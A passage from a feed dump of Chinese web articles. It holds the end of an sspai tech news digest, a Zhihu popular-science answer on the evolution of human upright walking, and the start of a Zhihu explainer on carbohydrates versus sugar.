Earbuds，并且两款设备均通过 Google Meet 和 Zoom 的认证。其中，Zone True Wireless 本次提供了石墨和玫瑰两种配色，续航能力可达 6 小时。两款产品将于今年秋季上市，价格分别为 299 美元和 99 美元。<a href=\"https://mspoweruser.com/logitech-zone-true-wireless-earbuds-anc-audio/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/828322e6d8570669eb6da02c54d30a24\"></figure><h3>Apple 发布支持 Touch ID 的妙控键盘</h3>\n<p>8 月 3 日，Apple 在官网商店更新信息，加入全新的两款妙控键盘、鼠标和触摸板，本次发布的两款键盘的区别在于是否带有数字小键盘，但他们均支持触控 Touch ID，适用于搭载 M1 芯片的 Mac 系列，售价分别为 1249 元和 1049 元。<a href=\"https://www.apple.com.cn/shop/product/MK293CH/A\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/cc676478bef9972d39f8a64b29d7aeca\"></figure><h3>腾讯推出游戏未保「双减双打」新措施</h3>\n<p>8 月 3 日腾讯正式宣布将推出面向全线游戏的「双减、双打、三提倡」的七条新举措，其中「双减」分别为减少游戏时长和减充值（未满 12 岁不得充值）；「双打」为打击身份冒用、打击作弊；「三倡议」为倡议全行业进一步强化游戏防沉迷系统、倡议深化对游戏适龄评定和实施机制的研究以及倡议全行业讨论全面禁止未满 12 周岁小学生进入游戏的可行性。以上举措皆在加大对未成年人的保护力度。<a href=\"https://mp.weixin.qq.com/s/jYZu4XKCib9h3HbHc7hZqA\" target=\"_blank\">来源</a></p>\n<h3>realme 正式推出 Android 首款磁吸无线技术解决方案</h3>\n<p>8 月 3 日晚间，realme 在其磁吸技术全球发布会上正式发布多个 Android 磁吸技术产品，其中 realme Flash 为 Android 首款磁吸无线充电手机，手机将拥有环形磁铁和方向充电线圈来实现磁吸安全充电。同步发布的还有两种不同规格的磁吸无线充电适配器，其中 50W MagDart 磁吸闪充适配器内置 1.5mm 磁铁，低阻抗充电线圈以及微型风冷散热，可以达到媲美有线闪充的充电速度；15W MagDart 磁吸无线闪充适配器设计上更为纤薄，最薄仅 3.9mm，最大充电功率为 15W，充电效率达到了 50mAh/分钟。</p>\n<p>此外针对磁吸技术，realme 还同步推出了 MagDart 磁吸无线闪充移动电源，内置 MagDart 磁吸无线闪充模块，采用高质量铝合金中框并使用素皮材质包裹，并还推出了对应的无线闪充电源支架；以及全新的磁吸环闪自拍灯、磁吸卡包以及磁吸充电手机壳灯多个磁吸相关革新产品。<a href=\"https://m.weibo.cn/status/4666208409093532?\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/b124c2dd46957f19330d9ad01e5d8581.jpeg\"></figure><h3>Apple 为 Mac Pro 提供新款 AMD Radeon 显卡选项</h3>\n<p>Apple 针对 Mac Pro 推出了基于新款 AMD Radeon 显卡选项，其中共有三种不同配置的显卡单元模块可供选择，分别为 Radeon Pro W6800X MPX 模块、Radeon Pro W6800X Duo MPX 模块以及 Radeon Pro W6900X MPX 模块；而 Apple 也表示新的模块将进一步提高部分软件中的运行性能，例如运行 Octane X 时性能将提高 84%，使用 DaVinci Resolve 时性能提高多达 23%。</p>\n<p>模块价格上，Radeon Pro W6800X MPX 模块的售价为 2400 美元，Radeon Pro W6800X Duo MPX 模块为 4600 美元，Radeon Pro W6900X MPX 模块 为 5600 美元，新的模块将取代之前的 AMD Radeon Pro Vega II MPX 模块。<a href=\"https://www.theverge.com/2021/8/3/22607730/apple-mac-pro-amd-radeo-pro-gpu-options\" target=\"_blank\">来源</a></p>\n<h2><strong>看看就行的小道消息</strong></h2>\n<ul>\n<li>据网络信息爆料，今年 9 月三星或将发布搭载 50MP RGBW 传感器的 Galaxy S22 。<a href=\"https://www.gsmarena.com/samsung_galaxy_s22_to_have_a_50_mp_rgbw_sensor-news-50334.php\" target=\"_blank\">来源</a>\n</li>\n<li>据 DigiTimes 报道，近期供应链显示，Apple 将在未来的设备中更多选用集成式无源器件，节约机身空间，以提供更大的电池容量。<a href=\"https://wccftech.com/future-iphones-ipads-and-macbooks-to-have-larger-space-for-batteries-as-apple-adopts-slimmer-chips/\" target=\"_blank\">来源</a>\n</li>\n<li>在知名爆料人 Mark Gurman 的最新通讯中，他提及 Apple 将在 2022 年 11 月前全面采用 Apple Silicon 自研芯片。传闻中的 M1X 芯片与高端 Mac mini 将在本年度发布，可能还有一台全新设计的更小尺寸的 Mac Pro 也会稍后登场。<a href=\"https://www.imore.com/new-m1x-macbook-pro-notebooks-appear-regulatory-filings-prior-launch\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员均将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>💻 少数派商店 Satechi 苹果周边配件 <a href=\"https://sspai.com/post/67873\" target=\"_blank\">限时特惠</a> 中，几款「果味儿」十足的第三方配件。</li>\n</ul>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68036\" target=\"_blank\">接送机、贵宾厅、星级酒店…… 聊聊我如何用信用卡「薅羊毛」</a></li>\n<li><a href=\"https://sspai.com/post/67922\" target=\"_blank\">从 RAW 照片到 Lightroom，这是我的手机摄影工作流</a></li>\n<li><a href=\"https://sspai.com/post/68056\" target=\"_blank\">一派 · 线下分享会 | 两年不见，这次我们想和你聊聊极客与好物</a></li>\n<li><a href=\"https://sspai.com/post/68071\" target=\"_blank\">Android 玩家必备神器入门：Magisk 核心功能和翻车自救指南</a></li>\n<li><a href=\"https://sspai.com/post/68074\" target=\"_blank\">Google Pixel 6 系列提前官宣：6 个细节、6 种配色，还有很 6 的配置</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68094"},{"title":"生物进化过程中，为什么只有人类选择了直立行走？","date":"2021-08-03 23:06:57","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-439ef46e0336491f79b9799140ae412c_l.jpg?source=8673f162\"><span>老牛头，</span><span>地质学/古生物学</span>\n<a href=\"https://www.zhihu.com/question/475904693/answer/2033302636\" hidden>阅读原文</a>\n</div>\n<div>\n<p>首先双足行走不等于直立行走，这个回答已经说的很好了。</p>\n<p><a href=\"https://www.zhihu.com/question/475904693/answer/2028959496\">生物进化过程中，为什么只有人类选择了直立行走？</a></p>\n<p>在所有脊椎动物中，只有人类是以直立行走的，即人类的脊柱垂直于地面，同时人类以双足行走。</p>\n<p><strong>一、人类为何直立行走还要从猿类说起</strong></p>\n<p>我们都知道，现生的猿类（长臂猿、猩猩、大猩猩、黑猩猩、人类）与其他灵长类最大一个区别在于没有尾巴。</p>\n<p>猿类没有尾巴，有可能与它们的运动方式有关。</p>\n<p>对于猴子来说，它们在树上的运动方式主要以四肢并用为主，它们仍然是主要依靠四条腿运动的动物。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f2200e31233f3d1686ea8b59e999e23a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>在树上运动猕猴，图片来源 https://scatterfeed.wordpress.com/2014/07/21/primates-drawn-by-people-whove-never-seen-primates/</figcaption></figure><p>尾巴对于主要靠四足运动的猴子来说十分重要，猴子们靠四足在树枝上奔跑以及树枝间跳跃时需要依靠尾巴来保持平衡。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-df00552d62c8f88636c7d897ed87e25e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>猴类的骨骼形态适于使用四足在树上运动，图片来源 https://www.life.umd.edu/classroom/bsci338m/Lectures/Locomotion.html</figcaption></figure><p>而现生猿类的运动方式主要包括两方面，臂行（quadrupedalism）与垂直攀爬（vertical climbing），臂行就是指在树枝间悬挂摆臂穿行。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b1dff53752c06498fd53b78b35f8d886_720w.jpg?source=8673f162\" alt=\"\"><figcaption>进行臂行的长臂猿，图片来源 https://triz.guru/index.php?route=news/article&amp;amp;amp;amp;news_id=6</figcaption></figure><p>垂直攀爬（Vertical Climbing）是指在树干上垂直向上爬树，猿类垂直攀爬的方式与猴子是不一样的。<sup>[1]</sup></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-805d3f652c3c05336576e067cc5a4f07_720w.jpg?source=8673f162\" alt=\"\"><figcaption>正在垂直攀爬树干的黑猩猩。图片来源：https://en.wikipedia.org/wiki/File:Gombe_Stream_NP_Mutter_kletternd.jpg</figcaption></figure><p>可以发现，猿类的这两种运动方式，其身体都是垂直于地面的。而猴子一般都是附身四肢着地（）或者放在树枝上。</p>\n<p>换句话说，猿类相比于猴类，它们更适合身体主干垂直于地表的运动方式，而猴子仍然是附身运动，运动时身体主干通常与地面平行的四足动物。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1e8fa39f96532de05c551bdb5202cebc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>长着尾巴四足运动的猴类与猿类在运动方式上的区别，猿类更适应直着身子活动，猴类适应以四足动物传统的姿态活动。图片来源：https://science.sciencemag.org/content/372/6542/eabb4363</figcaption></figure><p>不过黑猩猩和大猩猩这两种猿类主要还是以四肢运动，但是它们使用四肢运动的指行方式和猴类是无法对比的。</p>\n<p><strong>所以说，人类直立行走中，身体直立的出现，可能早于双足行走。也就是先直立，再双足。</strong></p>\n<p>猿类为何要采用这种直立姿态进行运动呢？首先完整的干群猿类<em>Ekembo</em>化石研究表明，在猿类在适应垂直攀爬以及臂行之前就已经失去尾巴了，没有尾巴的<em>Ekembo</em>在树上的运动方式与猴类一样，使用四肢行走，但是没有尾巴的它们应该不太好掌握平衡。尾巴消失之后，猿类可能不得不演化出新的不同于猴类的身体偏向垂直的运动方式，因为这种运动方式对于尾巴的依赖更小。</p>\n<p>至于为什么猿类失去了尾巴，这就没人知道了，但这肯定是与环境变化和自然选择有关的，可能某种特定的环境让一些没有尾巴的猴类更有优势，从而演化成了猿类。要记住猿类特别的身体直立的运动方式出现于失去尾巴之后。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d6188a2fc89a06c78caa30afd2070913_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Ekembo nynazae 骨骼模型，图片来源 https://en.wikipedia.org/wiki/File:Proconsul_skeleton_reconstitution_(University_of_Zurich).JPG</figcaption></figure><p><strong>二、早期猿类的运动方式</strong></p>\n<p>2021 年 5 月 19 日，一篇发表在 Science 上的文章对现生猿类的运动方式进行了归纳，并对人类和黑猩猩最近共同祖先的运动方式进行了推断<sup>[2]</sup>：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-93787884a7a3b93aa02c2f5c433fb661_720w.jpg?source=8673f162\" alt=\"\"><figcaption>猴子和现生猿类的运动方式。图片来源：https://finance.sina.com.cn/tech/2021-05-12/doc-ikmxzfmm1943925.shtml</figcaption></figure><p>可以发现，人类和黑猩猩最近共同祖先的运动方式，很可能不同于今天任何一种猿类，根据研究推测它主要用四肢行走，具有垂直攀爬的能力，可能拥有少许的双足行走和站立能力，臂行可能不太行。</p>\n<p>这说明，双足站立或者行走的能力可能在人类起源之前，在我们与黑猩猩的最近共同祖先甚至更早的时候，就已经出现了。</p>\n<p>同时根据上图，今天的猩猩的也有较强的双足站立能力，可能也有少量的双足行走能力。</p>\n<p>其实，今天生活在地球上的任何一种猿类，可能都无法代表那些已经灭绝的猿类的运动方式，今天猿类的运动方式是它们适应于特定环境演化的结果，而且猿类的运动方式演化可能并不像我们想象的那样困难，同一种运动方式在两类猿类中各自独立演化也是有可能的。比如黑猩猩和大猩猩的指行可能是各自独立演化的。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6b66a5bc4c895a3f243f6a14c186193b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>指行：前足指关节拄地，后足脚掌着地，在地面上四足行走的黑猩猩。图片来源：http://einekleinenachtblog.blogspot.com/2007/07/evolution-of-bipedalism.html</figcaption></figure><p>那么已灭绝的猿类是如何运动的呢？</p>\n<p><strong>三、已经灭绝的猿类的运动方式</strong></p>\n<p>想要知道已经灭绝的猿类的运动方式，肯定要从化石记录中去寻找线索。</p>\n<p>这篇 Science 研究还对化石猿类在现生猿类系统发育树中的位置进行了讨论：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e90b4469b72e72c500b0edc50a5db244_720w.jpg?source=8673f162\" alt=\"\"><figcaption>简化的包括化石猿类在内的系统发育树。图片修改自：https://science.sciencemag.org/content/372/6542/eabb4363</figcaption></figure><p>通过这张图我们可以知道，<em>Nacholapithecus</em>和森林古猿类，对于我们探讨具有帮助，一个是因为它们所处的演化位置比较关键，<em>Nacholapithecus</em>可能代表了现生猿类或者现生人科祖先的近亲，而森林古猿类可能代表了现生人科、猩猩科或者现生人亚科的祖先的近亲。另一点是因为它们的化石保存的比较完整，在对这些化石进行关于运动方式的解读时可能更加准确。</p>\n<p>关于<em>Nacholapithecus</em>新发现的股骨化石的研究表明，<em>Nacholapithecus</em>的运动方式以四足行走和垂直攀爬为主，没有证据表明它们会臂行。四足运动加上一垂直攀爬为代表的反俯身向下运动可能代表了早期猿类的运动方式。<sup>[3]</sup></p>\n<p>森林古猿类包括很多古猿，其中对于运动方式研究得比较多的包括森林古猿、西班牙古猿、鲁道古猿和多瑙古猿，对于这些古猿化石的研究发现，这些古猿很可能同时拥有臂行和双足行走的能力，它们的腰部脊椎不像现生大猩猩和黑猩猩那样僵硬，而且更长一些，这种更灵活更长的腰椎适应在陆地双足行走的运动方式。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8bf016d4263c6e9698cf64c36e2cac7e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一种森林古猿，产于匈牙利的鲁道古猿的生活复原图，其中恢复了它们的臂行运动方式，图片来源：https://phys.org/news/2019-09-rare-million-year-old-fossil-unearths-view.html</figcaption></figure><p>而多瑙古猿保存了更多上下肢的化石，根据这些化石，研究人员认为，多瑙古猿可能拥有一套独特的运动方式，不同于任何现生的猿类和猴类，这种运动方式叫做伸展四肢攀爬（extended limb clambering，缩写为 ELC）。</p>\n<p>伸展四肢攀爬是指多瑙猿在树上的运动方式，这种运动方式的特征就是不会过多地依靠前肢或者后肢在树上运动，当多瑙猿在树上进行运动时，前肢和后肢的所承担的运动量基本上是相同的，比如它们有时候会使用上肢臂行，而有时候会使用下肢在树枝上站立步行。当我们把这两种运动方式放在一起看时，我们就会发现多瑙猿双足站立手臂向上伸展的姿态，四肢都伸展了起来，这就叫做“extended limb”.其在树上双足行走的运动方式完全可以适用于地面。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d23a9cdbca18f8e835e5658a2893a5b0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>多瑙猿的复原图，很好地表现了它们在树上的姿态，可以双足站立同时手可以向上伸有很好的臂行能力，图片来源：https://www.smithsonianmag.com/science-nature/new-ancient-ape-species-rewrites-story-bipedalism-180973479/</figcaption></figure><p>所以森林古猿可能是一类既可以臂行，又可以双足行走的猿类。</p>\n<p>总结一下，早在人类尚未起源之时，人类的直立姿态和双足行走能力很可能便已经在人类的猿类祖先中出现，人类后来失去了臂行和垂直攀爬的能力，加强了双足行走的能力，而黑猩猩则是加强了四肢指行的能力。所以人类和黑猩猩的最近共同祖先，可能既不像黑猩猩，也不像人。</p>\n<p><strong>四、人类的祖先为何选择直立行走？</strong></p>\n<p>既然人类的猿类祖先已经拥有了直立姿态和双足行走的基础，那么为什么人类朝着这一个方向加强了呢？</p>\n<p>关于人类的祖先为何选择双足行走，而不是像黑猩猩那样选择臂行，理论解释实在是太多了，《祖先的故事》- 第 0 汇合点 - 猿人这一章对于人类行走的演化动力做了比较详细和全面的介绍。</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//www.5itupu.com/KnowledgeShow-190%2C1757%2C0%2C17309%2C2.html\" target=\"_blank\" rel=\"nofollow noreferrer\">猿人 - 主题阅读 - 我爱图谱 - 知识图谱 - 思维导图 -www_5itupu_com</a></p>\n<p>直到今天人类为何选择直立行走仍然是研究的热点。</p>\n<p>但这里要打破一个比较传统的观点，即人类的直立行走与人类从森林环境来到草原环境有关，这与当时非洲的气候变化有关。</p>\n<p>近几年近针对早期人类比如地猿、原初人的研究表明，在南方古猿之前的早期人类实际上是生活在森林中的，这些人类拥有很好的攀爬能力甚至臂行能力，同时它们也拥有比较明显的双足直立行走能力，虽然不是特别完善，这表明人类的祖先选择直立行走很可能是发生在森林环境中，与森林消失变成草原无关。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ae4691e8a5116fe77607d6152b6f5873_720w.jpg?source=8673f162\" alt=\"\"><figcaption>始祖地猿的化石和骨骼以及身体复原图，图片来源：https://www.researchgate.net/publication/235351215_Ardipithecus_ramidus_and_the_birth_of_humanity/figures?lo=1&amp;amp;amp;utm_source=google&amp;amp;amp;utm_medium=organic</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-16dc7abb57395b72c9e1fb6d5c825d93_720w.jpg?source=8673f162\" alt=\"\"><figcaption>始祖地猿复原图，它们生活在森林环境中。图片来源：http://www.sci-news.com/archaeology/ardipithecus-ramidus-hand-09397.html</figcaption></figure><p><a href=\"http://link.zhihu.com/?target=http%3A//www.sci-news.com/archaeology/ardipithecus-ramidus-hand-09397.html\" target=\"_blank\" rel=\"nofollow noreferrer\">4.4-Million-Year-Old Ardipithecus Hand Reveals ‘Big Evolutionary Jump’ | Anthropology, Archaeology, Paleoanthropology | Sci-News.com</a></p>\n<p>那人类是如何放弃爬树的本领，变成完全在地面直立行走的人类的呢？</p>\n<p>2021 年 2 月 24 日发表在 Science Advances 上的文章对这个问题进行了回答，虽然文章很新，但是回答却很“旧”。<sup>[4]</sup></p>\n<p>研究认为，这与解放双手使用工具与直立行走有关，直立行走促进了人类双手变得更灵巧，人类不再把手作为爬树的工具，而是作为使用其他工具的工具。</p>\n<p>也许只有那些善于直立行走的人类才能解放双手，解放了双手才能更好地使用双手制造工具，才能更好地活下来。当然也有可能是环境变化逼迫人类不得不在地面生活，更适应使用双足行走，误打误撞地解放了双手。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-d104710346f8c0310aa15a67e46ccea0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>人类手部骨骼和足部骨骼与形态的变化。图片来源：https://advances.sciencemag.org/content/7/9/eabf2474</figcaption></figure><p>根据上图，我们可以看出，从始祖地猿化石出现的距今 440 万年到最早人类使用工具的最早记录，包括最早的石器（350-330 万年）和最早的骨骼上切割痕迹记录（老于 339 万年），这将近 100 万年的时间里，人类发生了十分关键的演化。</p>\n<p>人类的脚趾的拇趾不在于其他趾分开，而是并在一起，370 万年前的人类足迹化石（Laetoli ）和 320 万年前的阿尔法南方古猿的足部骨骼化石（A.L. 333）都证明了这一点，人类在适应完全双足行走的过程中抛弃了拇趾与其他趾分开这一特征，这个特征对于树栖十分有用，但是对于双足行走显然不太适应。这也是人类从树栖开始转向专门地面生活的一个反映。</p>\n<p>人类的双手开始变得更灵巧，320 万年前的阿尔法南方古猿的手部骨骼化石（A.L. 333）形态证明其拥有类似人属的精准抓握能力和有限的工具制造能力，这与最早的石器和工具使用记录相对应。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e4d0627fc44f3642b2ddcac9cc894f50_720w.jpg?source=8673f162\" alt=\"\"><figcaption>雄性阿法南猿的复原蜡像，图片来源：https://commons.wikimedia.org/wiki/File:NHM_-_Australopithecus_afarensis_Modell_1.jpg</figcaption></figure><p>所以说逼迫人类从树上走到地下的环境变化更有可能发生在 440-340 万年之间，人类来到地上后，越来越适应使用双足直立行走，从而解放了双手，双手变得更加灵巧，可以用于制造工具。</p>\n<p><strong>五、总结</strong></p>\n<p>所以为什么只有人类选择了直立行走？</p>\n<p>直立姿态和双足行走在人类的猿类祖先就已经出现了，猿类选择这种运动方式可能与尾巴的缺失有关，也可能于其他因素有关。</p>\n<p>人类确立直立行走的主要过程发生在森林中，这时人类是树栖的动物，拥有臂行和爬树的能力。至于 700-440 万年之间的人类是如何确立直立行走的？由于化石记录较少这点仍然不明。</p>\n<p>在 440-340 这 100 万年间，人类完成了完全直立行走，并开始使用双手制造工具，也许环境的变化促使了人类的生活环境从森林变成草原，人类不得不开始直立行走。也有可能双手制造工具有利于人类的生存，从而在双手变得越来越灵活的同时，促使了人类开始完全直立行走。</p>\n<p><strong>六、其他生物为何没有选择直立行走？</strong></p>\n<p>至于其他生物为何没有选择直立行走……</p>\n<p>每种生物都有自己的的演化道路，直立行走可以说是无意间形成的，每种生物在“选择”演化道路的同时，也就决定了其未来的道路，当然对于某种变化的选择不是生物自己做出的，是自然给它选择的。我们可以因为人类直立行走去寻找促成人类直立行走的原因，而那些没有直立行走的动物，你想知道为什么它们没有直立行走，只能说这个问题不成立，我们无法解释没有发生的事情。非要解释的话只能说直立行走需要做出的改变太多，脊柱要直立与地面，身体的很多骨骼包括内脏都要发生变化，这是一个很复杂的过程，你所看到的人类直立行走的最终成果，是几千万年中无数的变异和自然选择造就的，前一步决定后一步，如果哪次自然选择的动力发生了改变，可能就不会产生直立行走的人类了。</p>\n<p>其实在现生猿类中，直立行走并不是人类的专利，其他的猿类也可以偶尔直立行走。这也体现了人类双足直立行走的潜力在猿类时代便已经出现了。除了人类以外已灭绝的和现生的猿类之所以没有继续向直立行走演化下去，可能就是缺少一个演化的“契机”吧。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9b1a7204275b17753736c118d01a5b59_720w.jpg?source=8673f162\" alt=\"\"><figcaption>直立运动的现生猿类，图片来源 http://theprancingpapio.blogspot.com/2011/01/apes-walking-upright-thats-just-how.html</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/475904693\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738844"},{"title":"食物的碳水含量代表了它的含糖量吗？","date":"2021-08-03 23:06:50","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-d93c510561e24491142db8a8eab3091f_l.jpg?source=8673f162\"><span>钱程，</span><span>微信公众号，微博ID：技术型吃货</span>\n<a href=\"https://www.zhihu.com/question/299392664/answer/2019440827\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我早就想写篇文章系统地说说碳水化合物、可利用碳水化合物、精制碳水、糖、游离糖之类基础概念的联系和区别，正好看到这个问题，那就一起写了吧。</p>\n<p>画一个不太严谨的图，大概是这样的关系：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c939b409b8eb26f2c127512b36eca643_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我觉得，之所以很多人分不清「糖」和「碳水化合物」，很大程度上是因为，初高中化学课上，老师会告诉你，「碳水化合物」是旧称，现在已经不用了，而现在我们都叫它「糖类」。</p>\n<p><strong>但是，这是化学语境下的定义。在营养学语境中，目前「碳水化合物」还在使用，而且跟「糖」根本就不是一个意思。我们接下来在营养学语境的框架下探讨这几个概念的联系和区别。</strong></p>\n<hr>\n<p><strong><strong>1. 碳水化合物（Carbohydrates）到底包括哪些物质？</strong></strong></p>\n<p>首先，碳水化合物是最广的分类，广义的「碳水化合物」包括了所有的<strong>单糖、双糖、低聚糖、多糖、糖的衍生物（如糖醇类）等</strong>。其中：</p>\n<p><strong><strong>单糖（Monosaccharide）：</strong></strong></p>\n<p>指不能再被简单水解成更小的糖类的分子，最常见的像葡萄糖、果糖、半乳糖，核糖等等。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e39106bca89fbf99e14dff33f0a2d68d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>左上：葡萄糖。右上：果糖。下：半乳糖</figcaption></figure><p><strong><strong>双糖（二糖，disaccharide）：</strong></strong></p>\n<p>指两个单糖分子通过糖苷键结合在一块形成的分子。比如蔗糖就是果糖和葡萄糖结合而成的，乳糖是葡萄糖加半乳糖，麦芽糖是两个葡萄糖结合，这些都是常见的双糖。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-77396fe1c969266c3d899b50561334a8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>左上：麦芽糖。左下：乳糖。右下：蔗糖</figcaption></figure><p><strong><strong>低聚糖（寡糖，Oligosaccharide）：</strong></strong></p>\n<p>3~10 个单糖分子通过糖苷键「手拉手」形成的分子。比如水苏糖（Starchyose）、低聚果糖、低聚异麦芽糖等。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ba1c3c014299e54f83acb7c1e793c647_720w.jpg?source=8673f162\" alt=\"\"><figcaption>水苏糖：4 个单糖分子结合而成的低聚糖</figcaption></figure><p><strong><strong>多糖（Polysaccharide）：</strong></strong></p>\n<p>大于 10 个单糖分子「手拉手」形成的大分子。包括淀粉、纤维素、各种食品胶体（琼脂、卡拉胶、黄原胶、阿拉伯胶）等等。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-38c63e91591adb98d6e73fd147ffd70e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>淀粉就是由很多葡萄糖分子连接而成的长链结构</figcaption></figure><p><strong><strong>糖的衍生物（Saccharide derivatives）：</strong></strong></p>\n<p>包括糖醇类物质等。糖醇类通常在食品中作为甜味剂使用，比如木糖醇，麦芽糖醇，赤藓糖醇等。他们不是糖，但同样属于碳水化合物。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-5bbb436ec969e0d8400507aa6eb96f40_720w.jpg?source=8673f162\" alt=\"\"><figcaption>糖醇类物质其实就是多元醇，理论上甘油也可以算是最简单的糖醇类物质</figcaption></figure><p>以上这些物质，全都属于营养学语境下的「碳水化合物」大类。</p>\n<hr>\n<p><strong>2. 什么是营养学中的「糖」呢？</strong></p>\n<p>下面是重点：</p>\n<p><strong><strong>营养学中所说的「糖（Sugar）」，仅包括单糖和二糖。</strong></strong></p>\n<p>而上面提到的其他所有物质，都只算「碳水化合物」而不算「糖」<sup>[1]</sup>。</p>\n<p>是的，你没看错。</p>\n<ul>\n<li>葡萄糖，果糖，乳糖，蔗糖这些都算「糖」。</li>\n<li>低聚果糖、淀粉、纤维素，糖醇这些，都只算「碳水化合物」，不算「糖」。</li>\n</ul>\n<p><strong>什么是游离糖？</strong></p>\n<p>对于「糖」来说，<strong>如果是天然存在在果汁、蜂蜜等食物中，或是在加工烹饪中额外添加进食物中的糖分，那就称作「游离糖（free sugar）」</strong>。这部分糖分由于极易被人体吸收，而且可以迅速影响血糖平衡，是我们膳食中需要尽量避免的。世界卫生组织对于每人每日游离糖的建议限量是 50g，差不多是一小杯可乐或者奶茶的量。</p>\n<p><strong>我们平时说要「低糖饮食」，要「控糖」，指的是控制这部分游离糖的摄入。</strong>高游离糖饮食已被证明跟肥胖、糖尿病、心血管疾病甚至痛风的发生有高度相关性。</p>\n<p>除「游离糖」之外的糖分，比如牛奶中本身有的乳糖，水果蔬菜中本身有的葡萄糖和果糖，它们虽然也是糖，但吸收进体内的速度慢得多，危害性通常也没有那么大，而适量乳制品、水果蔬菜摄入对身体的好处显而易见。因此这些「内在糖」不在「控糖」要求的范围内。</p>\n<p>而淀粉、纤维素之类根本不算「糖」的东西，就更加跟「控糖」毫无关系了。</p>\n<hr>\n<p><strong>3. 「可利用碳水」和「不可利用碳水」区别在哪？</strong></p>\n<p>在所有的碳水化合物中，有些是可以吸收到体内，通过呼吸作用产生能量为我们所用的，还有一些是人体无法吸收，或者吸收了没法利用，最后只能排出体外的。</p>\n<p><strong>前者叫做「可利用碳水化合物」，后者叫做「不可利用碳水化合物」。</strong></p>\n<p>所有常见的「糖」都可以被吸收利用，所以糖都是「可利用碳水化合物」。除了糖以外，「可利用碳水化合物」还包括了一些低聚糖，以及多糖（比如普通的淀粉也可以为身体提供能量）。</p>\n<p>一些糖醇类物质，人体也能利用，比如木糖醇，山梨糖醇，它们都能为身体提供能量，只是比普通的蔗糖提供能量少而已。它们也算是「可利用碳水化合物」。</p>\n<p>而像纤维素、食品胶体、抗性淀粉、赤藓糖醇之类物质，不可以被身体利用、供能，所以它们是「不可利用碳水化合物」。</p>\n<hr>\n<p><strong>4. 什么是「膳食纤维」？</strong></p>\n<p>目前对于膳食纤维的官方定义是<strong>「聚合度 